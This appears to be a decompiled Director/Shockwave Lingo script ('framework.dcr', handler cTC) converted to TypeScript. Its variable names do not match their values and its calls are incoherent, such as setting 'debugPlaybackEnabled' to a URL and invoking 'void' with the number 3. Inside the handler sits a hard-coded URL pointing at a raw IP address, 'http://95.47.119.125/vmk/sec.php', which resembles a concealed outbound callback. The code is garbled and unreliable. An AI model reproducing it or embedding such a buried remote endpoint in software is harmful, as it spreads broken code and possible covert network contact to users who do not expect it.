// framework.dcr /  / cTC

import {
  callMethod, callNamed, chunkCount, chunkOf, deleteStringChunk, float,
  globalVar, lastChunk,
  lingoBinary, lingoTruthy,
  meProp, setGlobal, setMeProp, setTheProperty, setThePropOf, symbol, theProperty,
  thePropOf, LingoList, LingoPropList, _player, _key, _sound,
  type LingoMe, type LingoValue,
} from "../lingo/lingo-runtime.js";

export function cTC(_me: LingoMe, sprite: LingoValue) {
  /* global */ var ilk = globalVar("ilk");
  setGlobal("ilk", 0);
  if (sprite.releaseSprite) {
  callNamed("this", 0)
  } else {
  var count = ".cct";
  var getVariableManager = 3;
  var item = "http://95.47.119.125/vmk/sec.php";
  setThePropOf(sprite, "spriteNum", 1);
  setThePropOf(callNamed("void", getVariableManager), "_player", 1);
  setThePropOf(callNamed("void", getVariableManager), "debugPlaybackEnabled", item);
  setThePropOf(sprite, "releaseSprite", 0);
  callNamed("pState", theProperty("cursor"))
  setThePropOf(sprite, "itemDelimiter", callNamed("runMode", item));
  callMethod("voidp", theProperty("externalParamValue"), sprite)
  callNamed("this", 1)
  }

}

